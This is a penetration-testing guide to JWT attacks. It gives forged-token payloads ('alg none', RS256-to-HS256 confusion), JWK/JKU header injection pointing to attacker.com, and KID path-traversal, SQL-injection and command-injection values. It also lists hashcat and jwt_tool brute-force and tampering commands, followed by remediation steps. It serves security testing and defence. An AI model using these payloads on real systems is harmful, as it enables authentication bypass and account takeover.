# JWT (JSON Web Token) Attack Testing

## Overview
JWT attacks exploit weaknesses in JWT implementation, including algorithm confusion, weak secrets, token manipulation, and improper validation. These can lead to authentication bypass and privilege escalation.

## Classification
- **CWE:** CWE-287 (Improper Authentication), CWE-345 (Insufficient Verification of Data Authenticity)
- **OWASP:** A02:2021 - Cryptographic Failures, A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 7.5 - 9.8

## JWT Structure
```
Header.Payload.Signature

# Header
{"alg": "HS256", "typ": "JWT"}

# Payload
{"sub": "1234567890", "name": "John", "role": "user", "iat": 1516239022}

# Signature
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

## Attack Methodology

### 1. Algorithm None Attack
```json
// Change algorithm to "none"
{"alg": "none", "typ": "JWT"}

// Variations
{"alg": "None"}
{"alg": "NONE"}
{"alg": "nOnE"}
{"alg": "none", "typ": "JWT"} → base64url encode → remove signature
```

Result: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.`
Note: trailing dot, empty signature.

### 2. Algorithm Confusion (RS256 → HS256)
```
If server uses RS256 (asymmetric):
1. Obtain the public key (often in /jwks.json, /.well-known/jwks.json, /oauth/jwks)
2. Change algorithm from RS256 to HS256
3. Sign token using the public key as HMAC secret
4. Server verifies HMAC signature using public key → valid!
```

### 3. Weak Secret Brute Force
```bash
# hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# jwt_tool
jwt_tool <JWT> -C -d wordlist.txt

# Common weak secrets:
secret, password, 123456, jwt_secret, changeme,
your-256-bit-secret, key, mysecret, admin
```

### 4. JWK Header Injection
```json
// Embed attacker's key in the token itself
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "attacker_public_key_n",
    "e": "AQAB"
  }
}
```

### 5. JKU Header Injection
```json
// Point to attacker-controlled JWKS endpoint
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://attacker.com/.well-known/jwks.json"
}
// Host matching JWKS on attacker server
```

### 6. KID (Key ID) Injection

**Path traversal:**
```json
{"alg": "HS256", "kid": "../../../dev/null"}
// Sign with empty string as secret
```

**SQL injection:**
```json
{"alg": "HS256", "kid": "key1' UNION SELECT 'attacker_secret' -- "}
```

**Command injection:**
```json
{"alg": "HS256", "kid": "key1|whoami"}
```

### 7. Payload Manipulation
```json
// Change role
{"sub": "user123", "role": "admin"}

// Change user ID
{"sub": "admin_user_id", "role": "user"}

// Extend expiration
{"sub": "user123", "exp": 9999999999}

// Remove expiration
// (remove "exp" claim entirely)
```

### 8. Token Reuse / Replay
- Use expired tokens (check if expiration is validated)
- Reuse tokens after password change
- Reuse tokens after logout
- Cross-service token reuse

### 9. JWE (Encrypted JWT) Attacks
- Test for algorithm confusion in encryption
- Check for weak encryption keys
- Test `alg` and `enc` header manipulation

## Tool Usage

### jwt_tool
```bash
# Decode and analyze
jwt_tool <JWT>

# All automated tests
jwt_tool <JWT> -M at

# Algorithm none attack
jwt_tool <JWT> -X a

# Key confusion attack
jwt_tool <JWT> -X k -pk public_key.pem

# Brute force secret
jwt_tool <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Tamper claims
jwt_tool <JWT> -T -S hs256 -p "secret" -pc role -pv admin

# JKU injection
jwt_tool <JWT> -X s -ju "http://attacker.com/jwks.json"
```

### jwt_cracker
```bash
jwt-cracker <JWT> [alphabet] [max-length]
```

## Remediation
1. **Use strong secrets** — minimum 256-bit random key for HMAC
2. **Validate algorithm** — server-side algorithm enforcement, reject `none`
3. **Validate all claims** — exp, nbf, iss, aud
4. **Short expiration** — minimize token lifetime
5. **Rotate keys** — periodic key rotation
6. **Use asymmetric algorithms** (RS256, ES256) for distributed systems
7. **Don't trust JWK/JKU headers** — use server-side key storage
8. **Implement token revocation** — blacklist on logout/password change
9. **Validate KID safely** — no file paths or SQL in KID lookups

## Evidence Collection
- Original and modified JWT tokens
- Algorithm used and weakness exploited
- Claims modified (role, sub, exp)
- Secret key discovered (if brute forced)
- Impact assessment (privilege escalation, account takeover)
